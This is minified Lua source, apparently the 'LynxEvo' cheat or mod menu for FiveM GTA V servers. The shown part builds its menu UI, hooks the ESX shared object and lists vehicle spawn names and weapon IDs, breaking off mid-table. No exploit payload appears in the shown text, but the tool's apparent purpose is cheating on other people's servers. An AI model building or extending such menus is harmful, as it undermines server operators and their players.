local a=true
ESX=nil

Citizen.CreateThread(function()
    while ESX==nil do 
        TriggerEvent('esx:getSharedObject',function(c)
           
            ESX=c 
        end)
        Citizen.Wait(1000)
    end
end)

LynxEvo = {}
LynxEvo.debug=false
local function d(f)
    local k={}
    local l=
    GetGameTimer()/200

k.r=math.floor(math.sin(l*f+0)*127+128)k.g=math.floor(math.sin(l*f+2)*127+128)k.b=math.floor(math.sin(l*f+4)*127+128)return k end

local m={}local n={up=172,down=173,left=174,right=175,select=176,back=177}local o=0

local p=nil

local q=nil

local s=0.23

local t=0.11

local u=0.03

local v=1.0

local w=0.041

local A=0

local B=0.370

local C=0.005

local D=0.005

local E='34ByTe Community'local function F(G)if LynxEvo.debug then Citizen.Trace('[LynxEvo] '..tostring(G))end end

local function H(I,J,value)if I and m[I]then m[I][J]=value

F(I..' menu property changed: { '..tostring(J)..', '..tostring(value)..' }')end end

local function K(I)if I and m[I]then return m[I].visible else return false end end

local function L(I,M,N)if I and m[I]then H(I,'visible',M)if not N and m[I]then H(I,'currentOption',1)end

if M then if I~=q and K(q)then L(q,false)end

q=I end end end

local function O(G,x,y,P,Q,R,S,T,U)SetTextColour(Q.r,Q.g,Q.b,Q.a)SetTextFont(P)SetTextScale(R,R)if T then SetTextDropShadow(2,2,0,0,0)end

if m[q]then if S then SetTextCentre(S)elseif U then SetTextWrap(m[q].x,m[q].x+s-C)SetTextRightJustify(true)end end

SetTextEntry('STRING')AddTextComponentString(G)DrawText(x,y)end

local function V(x,y,W,height,Q)DrawRect(x,y,W,height,Q.r,Q.g,Q.b,Q.a)end

local function X()if m[q]then local x=m[q].x+s/2

local y=m[q].y+t/2

if m[q].titleBackgroundSprite then DrawSprite(m[q].titleBackgroundSprite.dict,m[q].titleBackgroundSprite.name,x,y,s,t,0.,255,255,255,255)else V(x,y,s,t,m[q].titleBackgroundColor)end

O(m[q].title,x,y-t/2+u,m[q].titleFont,m[q].titleColor,v,true)end end

local function Y()if m[q]then local x=m[q].x+s/2

local y=m[q].y+t+w/2

local Z={r=m[q].titleBackgroundColor.r,g=m[q].titleBackgroundColor.g,b=m[q].titleBackgroundColor.b,a=255}V(x,y,s,w,m[q].subTitleBackgroundColor)O(m[q].subTitle,m[q].x+C,y-w/2+D,A,Z,B,false)if o>m[q].maxOptionCount then O(tostring(m[q].currentOption)..' / '..tostring(o),m[q].x+s,y-w/2+D,A,Z,B,false,false,true)end end end

local function a0(G,a1)local x=m[q].x+s/2

local a2=nil

if m[q].currentOption<=m[q].maxOptionCount and o<=m[q].maxOptionCount then a2=o elseif o>m[q].currentOption-m[q].maxOptionCount and o<=m[q].currentOption then a2=o-(m[q].currentOption-m[q].maxOptionCount)end

if a2 then local y=m[q].y+t+w+w*a2-w/2

local a3=nil

local a4=nil

local a5=nil

local T=false

if m[q].currentOption==o then a3=m[q].menuFocusBackgroundColor

a4=m[q].menuFocusTextColor

a5=m[q].menuFocusTextColor else a3=m[q].menuBackgroundColor

a4=m[q].menuTextColor

a5=m[q].menuSubTextColor

T=true end

V(x,y,s,w,a3)O(G,m[q].x+C,y-w/2+D,A,a4,B,false,T)if a1 then O(a1,m[q].x+C,y-w/2+D,A,a5,B,false,T,true)end end end

function LynxEvo.CreateMenu(I,a6)m[I]={}m[I].title=a6

m[I].subTitle=E

m[I].visible=false

m[I].previousMenu=nil

m[I].aboutToBeClosed=false

m[I].x=0.75

m[I].y=0.19

m[I].currentOption=1

m[I].maxOptionCount=10

m[I].titleFont=1

m[I].titleColor={r=255,g=255,b=255,a=255}Citizen.CreateThread(function()while true do Citizen.Wait(0)local a7=d(1.0)m[I].titleBackgroundColor={r=a7.r,g=a7.g,b=a7.b,a=105}m[I].menuFocusBackgroundColor={r=255,g=255,b=255,a=100}end end)m[I].titleBackgroundSprite=nil

m[I].menuTextColor={r=255,g=255,b=255,a=255}m[I].menuSubTextColor={r=189,g=189,b=189,a=255}m[I].menuFocusTextColor={r=255,g=255,b=255,a=255}m[I].menuBackgroundColor={r=0,g=0,b=0,a=100}m[I].subTitleBackgroundColor={r=m[I].menuBackgroundColor.r,g=m[I].menuBackgroundColor.g,b=m[I].menuBackgroundColor.b,a=255}m[I].buttonPressedSound={name='~h~~r~> ~s~SELECT',set='HUD_FRONTEND_DEFAULT_SOUNDSET'}F(tostring(I)..' menu created')end

function LynxEvo.CreateSubMenu(I,a8,a9)if m[a8]then LynxEvo.CreateMenu(I,m[a8].title)if a9 then H(I,'subTitle',a9)else H(I,'subTitle',m[a8].subTitle)end

H(I,'previousMenu',a8)H(I,'x',m[a8].x)H(I,'y',m[a8].y)H(I,'maxOptionCount',m[a8].maxOptionCount)H(I,'titleFont',m[a8].titleFont)H(I,'titleColor',m[a8].titleColor)H(I,'titleBackgroundColor',m[a8].titleBackgroundColor)H(I,'titleBackgroundSprite',m[a8].titleBackgroundSprite)H(I,'menuTextColor',m[a8].menuTextColor)H(I,'menuSubTextColor',m[a8].menuSubTextColor)H(I,'menuFocusTextColor',m[a8].menuFocusTextColor)H(I,'menuFocusBackgroundColor',m[a8].menuFocusBackgroundColor)H(I,'menuBackgroundColor',m[a8].menuBackgroundColor)H(I,'subTitleBackgroundColor',m[a8].subTitleBackgroundColor)else F('Failed to create '..tostring(I)..' submenu: '..tostring(a8).." parent menu doesn't exist")end end

function LynxEvo.CurrentMenu()return q end

function LynxEvo.OpenMenu(I)if I and m[I]then PlaySoundFrontend(-1,'SELECT','HUD_FRONTEND_DEFAULT_SOUNDSET',true)L(I,true)if m[I].titleBackgroundSprite then RequestStreamedTextureDict(m[I].titleBackgroundSprite.dict,false)while not HasStreamedTextureDictLoaded(m[I].titleBackgroundSprite.dict)do Citizen.Wait(0)end end

F(tostring(I)..' menu opened')else F('Failed to open '..tostring(I).." menu: it doesn't exist")end end

function LynxEvo.IsMenuOpened(I)return K(I)end

function LynxEvo.IsAnyMenuOpened()for I,_ in pairs(m)do if K(I)then return true end end

return false end

function LynxEvo.IsMenuAboutToBeClosed()if m[q]then return m[q].aboutToBeClosed else return false end end

function LynxEvo.CloseMenu()if m[q]then if m[q].aboutToBeClosed then m[q].aboutToBeClosed=false

L(q,false)F(tostring(q)..' menu closed')PlaySoundFrontend(-1,'QUIT','HUD_FRONTEND_DEFAULT_SOUNDSET',true)o=0

q=nil

p=nil else m[q].aboutToBeClosed=true

F(tostring(q)..' menu about to be closed')end end end

function LynxEvo.Button(G,a1)local aa=G

if a1 then aa='{ '..tostring(aa)..', '..tostring(a1)..' }'end

if m[q]then o=o+1

local ab=m[q].currentOption==o

a0(G,a1)if ab then if p==n.select then PlaySoundFrontend(-1,m[q].buttonPressedSound.name,m[q].buttonPressedSound.set,true)F(aa..' button pressed')return true elseif p==n.left or p==n.right then PlaySoundFrontend(-1,'NAV_UP_DOWN','HUD_FRONTEND_DEFAULT_SOUNDSET',true)end end

return false else F('Failed to create '..aa..' button: '..tostring(q).." menu doesn't exist")return false end end

function LynxEvo.MenuButton(G,I)if m[I]then if LynxEvo.Button(G)then L(q,false)L(I,true,true)return true end else F('Failed to create '..tostring(G)..' menu button: '..tostring(I).." submenu doesn't exist")end

return false end

function LynxEvo.CheckBox(G,bool,ac)local ad='~r~~h~OFF'if bool then ad='~g~~h~ON'end

if LynxEvo.Button(G,ad)then bool=not bool

F(tostring(G)..' checkbox changed to '..tostring(bool))ac(bool)return true end

return false end

function LynxEvo.ComboBox(G,ae,af,ag,ac)local ah=#ae

local ai=ae[af]local ab=m[q].currentOption==o+1

if ah>1 and ab then ai='← '..tostring(ai)..' →'end

if LynxEvo.Button(G,ai)then ag=af

ac(af,ag)return true elseif ab then if p==n.left then if af>1 then af=af-1 else af=ah end elseif p==n.right then if af<ah then af=af+1 else af=1 end end else af=ag end

ac(af,ag)return false end

function LynxEvo.Display()if K(q)then if m[q].aboutToBeClosed then LynxEvo.CloseMenu()else ClearAllHelpMessages()X()Y()p=nil

if IsDisabledControlJustPressed(0,n.down)then PlaySoundFrontend(-1,'NAV_UP_DOWN','HUD_FRONTEND_DEFAULT_SOUNDSET',true)if m[q].currentOption<o then m[q].currentOption=m[q].currentOption+1 else m[q].currentOption=1 end elseif IsDisabledControlJustPressed(0,n.up)then PlaySoundFrontend(-1,'NAV_UP_DOWN','HUD_FRONTEND_DEFAULT_SOUNDSET',true)if m[q].currentOption>1 then m[q].currentOption=m[q].currentOption-1 else m[q].currentOption=o end elseif IsDisabledControlJustPressed(0,n.left)then p=n.left elseif IsDisabledControlJustPressed(0,n.right)then p=n.right elseif IsDisabledControlJustPressed(0,n.select)then p=n.select elseif IsDisabledControlJustPressed(0,n.back)then if m[m[q].previousMenu]then PlaySoundFrontend(-1,'BACK','HUD_FRONTEND_DEFAULT_SOUNDSET',true)L(m[q].previousMenu,true)else LynxEvo.CloseMenu()end end

o=0 end end end

function LynxEvo.SetMenuWidth(I,W)H(I,'width',W)end

function LynxEvo.SetMenuX(I,x)H(I,'x',x)end

function LynxEvo.SetMenuY(I,y)H(I,'y',y)end

function LynxEvo.SetMenuMaxOptionCountOnScreen(I,count)H(I,'maxOptionCount',count)end

function LynxEvo.SetTitleColor(I,r,g,b,aj)H(I,'titleColor',{['r']=r,['g']=g,['b']=b,['a']=aj or m[I].titleColor.a})end

function LynxEvo.SetTitleBackgroundColor(I,r,g,b,aj)H(I,'titleBackgroundColor',{['r']=r,['g']=g,['b']=b,['a']=aj or m[I].titleBackgroundColor.a})end

function LynxEvo.SetTitleBackgroundSprite(I,ak,al)H(I,'titleBackgroundSprite',{dict=ak,name=al})end

function LynxEvo.SetSubTitle(I,G)H(I,'subTitle',G)end

function LynxEvo.SetMenuBackgroundColor(I,r,g,b,aj)H(I,'menuBackgroundColor',{['r']=r,['g']=g,['b']=b,['a']=aj or m[I].menuBackgroundColor.a})end

function LynxEvo.SetMenuTextColor(I,r,g,b,aj)H(I,'menuTextColor',{['r']=r,['g']=g,['b']=b,['a']=aj or m[I].menuTextColor.a})end

function LynxEvo.SetMenuSubTextColor(I,r,g,b,aj)H(I,'menuSubTextColor',{['r']=r,['g']=g,['b']=b,['a']=aj or m[I].menuSubTextColor.a})end

function LynxEvo.SetMenuFocusColor(I,r,g,b,aj)H(I,'menuFocusColor',{['r']=r,['g']=g,['b']=b,['a']=aj or m[I].menuFocusColor.a})end

function LynxEvo.SetMenuButtonPressedSound(I,name,am)H(I,'buttonPressedSound',{['name']=name,['set']=am})end

function KeyboardInput(an,ao,ap)AddTextEntry('FMMC_KEY_TIP1',an..':')DisplayOnscreenKeyboard(1,'FMMC_KEY_TIP1','',ao,'','','',ap)blockinput=true

while UpdateOnscreenKeyboard()~=1 and UpdateOnscreenKeyboard()~=2 do Citizen.Wait(0)end

if UpdateOnscreenKeyboard()~=2 then AddTextEntry('FMMC_KEY_TIP1','')local k=GetOnscreenKeyboardResult()Citizen.Wait(500)blockinput=false

return k else AddTextEntry('FMMC_KEY_TIP1','')Citizen.Wait(500)blockinput=false

return nil end end

local function aq()local ar={}for i=0,GetNumberOfPlayers()do if NetworkIsPlayerActive(i)then ar[#ar+1]=i end end

return ar end

function DrawText3D(x,y,z,G,r,g,b)SetDrawOrigin(x,y,z,0)SetTextFont(0)SetTextProportional(0)SetTextScale(0.0,0.20)SetTextColour(r,g,b,255)SetTextDropshadow(0,0,0,0,255)SetTextEdge(2,0,0,0,150)SetTextDropShadow()SetTextOutline()SetTextEntry('STRING')SetTextCentre(1)AddTextComponentString(G)DrawText(0.0,0.0)ClearDrawOrigin()end

function math.round(as,at)return tonumber(string.format('%.'..(at or 0)..'f',as))end

local function d(f)local k={}local l=GetGameTimer()/1000

k.r=math.floor(math.sin(l*f+0)*127+128)k.g=math.floor(math.sin(l*f+2)*127+128)k.b=math.floor(math.sin(l*f+4)*127+128)return k end

local function au(G,av)SetNotificationTextEntry('STRING')AddTextComponentString(G)DrawNotification(av,false)if rgbnot then for i=0,24 do i=i+1

SetNotificationBackgroundColor(i)end else SetNotificationBackgroundColor(24)end end

function checkValidVehicleExtras()local aw=PlayerPedId()local ax=GetVehiclePedIsIn(aw,false)local ay={}for i=0,50,1 do if DoesExtraExist(ax,i)then local az='~h~Extra #'..tostring(i)local G='OFF'if IsVehicleExtraTurnedOn(ax,i)then G='ON'end

local aA='~h~extra '..tostring(i)table.insert(ay,{menuName=realModName,data={['action']=realSpawnName,['state']=G}})end end

return ay end

function DoesVehicleHaveExtras(veh)for i=1,30 do if DoesExtraExist(veh,i)then return true end end

return false end

function checkValidVehicleMods(aB)local aw=PlayerPedId()local ax=GetVehiclePedIsIn(aw,false)local ay={}local aC=GetNumVehicleMods(ax,aB)if aB==48 and aC==0 then local aC=GetVehicleLiveryCount(ax)for i=1,aC,1 do local aD=i-1

local aE=GetLiveryName(ax,aD)local realModName=GetLabelText(aE)local aF,realSpawnName=aB,aD

ay[i]={menuName=realModName,data={['modid']=aF,['realIndex']=realSpawnName}}end end

for i=1,aC,1 do local aD=i-1

local aE=GetModTextLabel(ax,aB,aD)local realModName=GetLabelText(aE)local aF,realSpawnName=aC,aD

ay[i]={menuName=realModName,data={['modid']=aF,['realIndex']=realSpawnName}}end

if aC>0 then local aD=-1

local aF,realSpawnName=aB,aD

table.insert(ay,1,{menuName='Stock',data={['modid']=aF,['realIndex']=realSpawnName}})end

return ay end

local aG={'Dinghy','Dinghy2','Dinghy3','Dingh4','Jetmax','Marquis','Seashark','Seashark2','Seashark3','Speeder','Speeder2','Squalo','Submersible','Submersible2','Suntrap','Toro','Toro2','Tropic','Tropic2','Tug'}local aH={'Benson','Biff','Cerberus','Cerberus2','Cerberus3','Hauler','Hauler2','Mule','Mule2','Mule3','Mule4','Packer','Phantom','Phantom2','Phantom3','Pounder','Pounder2','Stockade','Stockade3','Terbyte'}local aI={'Blista','Blista2','Blista3','Brioso','Dilettante','Dilettante2','Issi2','Issi3','issi4','Iss5','issi6','Panto','Prarire','Rhapsody'}local aJ={'CogCabrio','Exemplar','F620','Felon','Felon2','Jackal','Oracle','Oracle2','Sentinel','Sentinel2','Windsor','Windsor2','Zion','Zion2'}local aK={'Bmx','Cruiser','Fixter','Scorcher','Tribike','Tribike2','tribike3'}local aL={'ambulance','FBI','FBI2','FireTruk','PBus','police','Police2','Police3','Police4','PoliceOld1','PoliceOld2','PoliceT','Policeb','Polmav','Pranger','Predator','Riot','Riot2','Sheriff','Sheriff2'}local aM={'Akula','Annihilator','Buzzard','Buzzard2','Cargobob','Cargobob2','Cargobob3','Cargobob4','Frogger','Frogger2','Havok','Hunter','Maverick','Savage','Seasparrow','Skylift','Supervolito','Supervolito2','Swift','Swift2','Valkyrie','Valkyrie2','Volatus'}local aN={'Bulldozer','Cutter','Dump','Flatbed','Guardian','Handler','Mixer','Mixer2','Rubble','Tiptruck','Tiptruck2'}local aO={'APC','Barracks','Barracks2','Barracks3','Barrage','Chernobog','Crusader','Halftrack','Khanjali','Rhino','Scarab','Scarab2','Scarab3','Thruster','Trailersmall2'}local aP={'Akuma','Avarus','Bagger','Bati2','Bati','BF400','Blazer4','CarbonRS','Chimera','Cliffhanger','Daemon','Daemon2','Defiler','Deathbike','Deathbike2','Deathbike3','Diablous','Diablous2','Double','Enduro','esskey','Faggio2','Faggio3','Faggio','Fcr2','fcr','gargoyle','hakuchou2','hakuchou','hexer','innovation','Lectro','Manchez','Nemesis','Nightblade','Oppressor','Oppressor2','PCJ','Ratbike','Ruffian','Sanchez2','Sanchez','Sanctus','Shotaro','Sovereign','Thrust','Vader','Vindicator','Vortex','Wolfsbane','zombiea','zombieb'}local aQ={'Blade','Buccaneer','Buccaneer2','Chino','Chino2','clique','Deviant','Dominator','Dominator2','Dominator3','Dominator4','Dominator5','Dominator6','Dukes','Dukes2','Ellie','Faction','faction2','faction3','Gauntlet','Gauntlet2','Hermes','Hotknife','Hustler','Impaler','Impaler2','Impaler3','Impaler4','Imperator','Imperator2','Imperator3','Lurcher','Moonbeam','Moonbeam2','Nightshade','Phoenix','Picador','RatLoader','RatLoader2','Ruiner','Ruiner2','Ruiner3','SabreGT','SabreGT2','Sadler2','Slamvan','Slamvan2','Slamvan3','Slamvan4','Slamvan5','Slamvan6','Stalion','Stalion2','Tampa','Tampa3','Tulip','Vamos,','Vigero','Virgo','Virgo2','Virgo3','Voodoo','Voodoo2','Yosemite'}local aR={'BFinjection','Bifta','Blazer','Blazer2','Blazer3','Blazer5','Bohdi','Brawler','Bruiser','Bruiser2','Bruiser3','Caracara','DLoader','Dune','Dune2','Dune3','Dune4','Dune5','Insurgent','Insurgent2','Insurgent3','Kalahari','Kamacho','LGuard','Marshall','Mesa','Mesa2','Mesa3','Monster','Monster4','Monster5','Nightshark','RancherXL','RancherXL2','Rebel','Rebel2','RCBandito','Riata','Sandking','Sandking2','Technical','Technical2','Technical3','TrophyTruck','TrophyTruck2','Freecrawler','Menacer'}local aS={'AlphaZ1','Avenger','Avenger2','Besra','Blimp','blimp2','Blimp3','Bombushka','Cargoplane','Cuban800','Dodo','Duster','Howard','Hydra','Jet','Lazer','Luxor','Luxor2','Mammatus','Microlight','Miljet','Mogul','Molotok','Nimbus','Nokota','Pyro','Rogue','Seabreeze','Shamal','Starling','Stunt','Titan','Tula','Velum','Velum2','Vestra','Volatol','Striekforce'}local aT={'BJXL','Baller','Baller2','Baller3','Baller4','Baller5','Baller6','Cavalcade','Cavalcade2','Dubsta','Dubsta2','Dubsta3','FQ2','Granger','Gresley','Habanero','Huntley','Landstalker','patriot','Patriot2','Radi','Rocoto','Seminole','Serrano','Toros','XLS','XLS2'}local aU={'Asea','Asea2','Asterope','Cog55','Cogg552','Cognoscenti','Cognoscenti2','emperor','emperor2','emperor3','Fugitive','Glendale','ingot','intruder','limo2','premier','primo','primo2','regina','romero','stafford','Stanier','stratum','stretch','surge','tailgater','warrener','Washington'}local aV={'Airbus','Brickade','Bus','Coach','Rallytruck','Rentalbus','taxi','Tourbus','Trash','Trash2','WastIndr','PBus2'}local aW={'Alpha','Banshee','Banshee2','BestiaGTS','Buffalo','Buffalo2','Buffalo3','Carbonizzare','Comet2','Comet3','Comet4','Comet5','Coquette','Deveste','Elegy','Elegy2','Feltzer2','Feltzer3','FlashGT','Furoregt','Fusilade','Futo','GB200','Hotring','Infernus2','Italigto','Jester','Jester2','Khamelion','Kurama','Kurama2','Lynx','MAssacro','MAssacro2','neon','Ninef','ninfe2','omnis','Pariah','Penumbra','Raiden','RapidGT','RapidGT2','Raptor','Revolter','Ruston','Schafter2','Schafter3','Schafter4','Schafter5','Schafter6','Schlagen','Schwarzer','Sentinel3','Seven70','Specter','Specter2','Streiter','Sultan','Surano','Tampa2','Tropos','Verlierer2','ZR380','ZR3802','ZR3803'}local aX={'Ardent','BType','BType2','BType3','Casco','Cheetah2','Cheburek','Coquette2','Coquette3','Deluxo','Fagaloa','Gt500','JB700','JEster3','MAmba','Manana','Michelli','Monroe','Peyote','Pigalle','RapidGT3','Retinue','Savastra','Stinger','Stingergt','Stromberg','Swinger','Torero','Tornado','Tornado2','Tornado3','Tornado4','Tornado5','Tornado6','Viseris','Z190','ZType'}local aY={'Adder','Autarch','Bullet','Cheetah','Cyclone','EntityXF','Entity2','FMJ','GP1','Infernus','LE7B','Nero','Nero2','Osiris','Penetrator','PFister811','Prototipo','Reaper','SC1','Scramjet','Sheava','SultanRS','Superd','T20','Taipan','Tempesta','Tezeract','Turismo2','Turismor','Tyrant','Tyrus','Vacca','Vagner','Vigilante','Visione','Voltic','Voltic2','Zentorno','Italigtb','Italigtb2','XA21'}local aZ={'ArmyTanker','ArmyTrailer','ArmyTrailer2','BaleTrailer','BoatTrailer','CableCar','DockTrailer','Graintrailer','Proptrailer','Raketailer','TR2','TR3','TR4','TRFlat','TVTrailer','Tanker','Tanker2','Trailerlogs','Trailersmall','Trailers','Trailers2','Trailers3'}local a_={'Freight','Freightcar','Freightcont1','Freightcont2','Freightgrain','Freighttrailer','TankerCar'}local b0={'Airtug','Caddy','Caddy2','Caddy3','Docktug','Forklift','Mower','Ripley','Sadler','Scrap','TowTruck','Towtruck2','Tractor','Tractor2','Tractor3','TrailerLArge2','Utilitruck','Utilitruck3','Utilitruck2'}local b1={'Bison','Bison2','Bison3','BobcatXL','Boxville','Boxville2','Boxville3','Boxville4','Boxville5','Burrito','Burrito2','Burrito3','Burrito4','Burrito5','Camper','GBurrito','GBurrito2','Journey','Minivan','Minivan2','Paradise','pony','Pony2','Rumpo','Rumpo2','Rumpo3','Speedo','Speedo2','Speedo4','Surfer','Surfer2','Taco','Youga','youga2'}local b2={'Boats','Commercial','Compacts','Coupes','Cycles','Emergency','Helictopers','Industrial','Military','Motorcycles','Muscle','Off-Road','Planes','SUVs','Sedans','Service','Sports','Sports Classic','Super','Trailer','Trains','Utility','Vans'}local b3={aG,aH,aI,aJ,aK,aL,aM,aN,aO,aP,aQ,aR,aS,aT,aU,aV,aW,aX,aY,aZ,a_,b0,b1}local b4={'ArmyTanker','ArmyTrailer','ArmyTrailer2','BaleTrailer','BoatTrailer','CableCar','DockTrailer','Graintrailer','Proptrailer','Raketailer','TR2','TR3','TR4','TRFlat','TVTrailer','Tanker','Tanker2','Trailerlogs','Trailersmall','Trailers','Trailers2','Trailers3'}local b5={'WEAPON_KNIFE','WEAPON_KNUCKLE','WEAPON_NIGHTSTICK','WEAPON_HAMMER','WEAPON_BAT','WEAPON_GOLFCLUB','WEAPON_CROWBAR','WEAPON_BOTTLE','WEAPON_DAGGER','WEAPON_HATCHET','WEAPON_MACHETE','WEAPON_FLASHLIGHT','WEAPON_SWITCHBLADE','WEAPON_PISTOL','WEAPON_PISTOL_MK2','WEAPON_COMBATPISTOL','WEAPON_APPISTOL','WEAPON_PISTOL50','WEAPON_SNSPISTOL','WEAPON_HEAVYPISTOL','WEAPON_VINTAGEPISTOL','WEAPON_STUNGUN','WEAPON_FLAREGUN','WEAPON_MARKSMANPISTOL','WEAPON_REVOLVER','WEAPON_MICROSMG','WEAPON_SMG','WEAPON_SMG_MK2','WEAPON_ASSAULTSMG','WEAPON_MG','WEAPON_COMBATMG','WEAPON_COMBATMG_MK2','WEAPON_COMBATPDW','WEAPON_GUSENBERG','WEAPON_MACHINEPISTOL','WEAPON_ASSAULTRIFLE','WEAPON_ASSAULTRIFLE_MK2','WEAPON_CARBINERIFLE','WEAPON_CARBINERIFLE_MK2','WEAPON_ADVANCEDRIFLE','WEAPON_SPECIALCARBINE','WEAPON_BULLPUPRIFLE','WEAPON_COMPACTRIFLE','WEAPON_PUMPSHOTGUN','WEAPON_SAWNOFFSHOTGUN','WEAPON_BULLPUPSHOTGUN','WEAPON_ASSAULTSHOTGUN','WEAPON_MUSKET','WEAPON_HEAVYSHOTGUN','WEAPON_DBSHOTGUN','WEAPON_SNIPERRIFLE','WEAPON_HEAVYSNIPER','WEAPON_HEAVYSNIPER_MK2','WEAPON_MARKSMANRIFLE','WEAPON_GRENADELAUNCHER','WEAPON_GRENADELAUNCHER_SMOKE','WEAPON_RPG','WEAPON_STINGER','WEAPON_FIREWORK','WEAPON_HOMINGLAUNCHER','WEAPON_GRENADE','WEAPON_STICKYBOMB','WEAPON_PROXMINE','WEAPON_BZGAS','WEAPON_SMOKEGRENADE','WEAPON_MOLOTOV','WEAPON_FIREEXTINGUISHER','WEAPON_PETROLCAN','WEAPON_SNOWBALL','WEAPON_FLARE','WEAPON_BALL'}local b6={Melee={BaseballBat={id='weapon_bat',name='~h~~r~> ~s~Baseball Bat',bInfAmmo=false,mods={}},BrokenBottle={id='weapon_bottle',name='~h~~r~> ~s~Broken Bottle',bInfAmmo=false,mods={}},Crowbar={id='weapon_Crowbar',name='~h~~r~> ~s~Crowbar',bInfAmmo=false,mods={}},Flashlight={id='weapon_flashlight',name='~h~~r~> ~s~Flashlight',bInfAmmo=false,mods={}},GolfClub={id='weapon_golfclub',name='~h~~r~> ~s~Golf Club',bInfAmmo=false,mods={}},BrassKnuckles={id='weapon_knuckle',name='~h~~r~> ~s~Brass Knuckles',bInfAmmo=false,mods={}},Knife={id='weapon_knife',name='~h~~r~> ~s~Knife',bInfAmmo=false,mods={}},Machete={id='weapon_machete',name='~h~~r~> ~s~Machete',bInfAmmo=false,mods={}},Switchblade={id='weapon_switchblade',name='~h~~r~> ~s~Switchblade',bInfAmmo=false,mods={}},Nightstick={id='weapon_nightstick',name='~h~~r~> ~s~Nightstick',bInfAmmo=false,mods={}},BattleAxe={id='weapon_battleaxe',name='~h~~r~> ~s~Battle Axe',bInfAmmo=false,mods={}}},Handguns={Pistol={id='weapon_pistol',name='~h~~r~> ~s~Pistol',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_PISTOL_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_PISTOL_CLIP_02'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_PI_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_PI_SUPP_02'}}}},PistolMK2={id='weapon_pistol_mk2',name='~h~~r~> ~s~Pistol MK 2',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_PISTOL_MK2_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_PISTOL_MK2_CLIP_02'},{name='~h~~r~> ~s~Tracer Rounds',id='COMPONENT_PISTOL_MK2_CLIP_TRACER'},{name='~h~~r~> ~s~Incendiary Rounds',id='COMPONENT_PISTOL_MK2_CLIP_INCENDIARY'},{name='~h~~r~> ~s~Hollow Point Rounds',id='COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT'},{name='~h~~r~> ~s~FMJ Rounds',id='COMPONENT_PISTOL_MK2_CLIP_FMJ'}},Sights={{name='~h~~r~> ~s~Mounted Scope',id='COMPONENT_AT_PI_RAIL'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_PI_FLSH_02'}},BarrelAttachments={{name='~h~~r~> ~s~Compensator',id='COMPONENT_AT_PI_COMP'},{name='~h~~r~> ~s~Suppessor',id='COMPONENT_AT_PI_SUPP_02'}}}},CombatPistol={id='weapon_combatpistol',name='~h~Combat Pistol',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_COMBATPISTOL_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_COMBATPISTOL_CLIP_02'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_PI_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_PI_SUPP'}}}},APPistol={id='weapon_appistol',name='AP Pistol',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_APPISTOL_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_APPISTOL_CLIP_02'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_PI_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_PI_SUPP'}}}},StunGun={id='weapon_stungun',name='~h~~r~> ~s~Stun Gun',bInfAmmo=false,mods={}},Pistol50={id='weapon_pistol50',name='~h~~r~> ~s~Pistol .50',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_PISTOL50_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_PISTOL50_CLIP_02'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_PI_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_PI_SUPP_02'}}}},SNSPistol={id='weapon_snspistol',name='~h~~r~> ~s~SNS Pistol',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_SNSPISTOL_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_SNSPISTOL_CLIP_02'}}}},SNSPistolMkII={id='weapon_snspistol_mk2',name='~h~~r~> ~s~SNS Pistol Mk II',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_SNSPISTOL_MK2_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_SNSPISTOL_MK2_CLIP_02'},{name='~h~~r~> ~s~Tracer Rounds',id='COMPONENT_SNSPISTOL_MK2_CLIP_TRACER'},{name='~h~~r~> ~s~Incendiary Rounds',id='COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY'},{name='~h~~r~> ~s~Hollow Point Rounds',id='COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT'},{name='~h~~r~> ~s~FMJ Rounds',id='COMPONENT_SNSPISTOL_MK2_CLIP_FMJ'}},Sights={{name='~h~~r~> ~s~Mounted Scope',id='COMPONENT_AT_PI_RAIL_02'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_PI_FLSH_03'}},BarrelAttachments={{name='~h~~r~> ~s~Compensator',id='COMPONENT_AT_PI_COMP_02'},{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_PI_SUPP_02'}}}},HeavyPistol={id='weapon_heavypistol',name='~h~~r~> ~s~Heavy Pistol',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_HEAVYPISTOL_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_HEAVYPISTOL_CLIP_02'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_PI_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_PI_SUPP'}}}},VintagePistol={id='weapon_vintagepistol',name='~h~~r~> ~s~Vintage 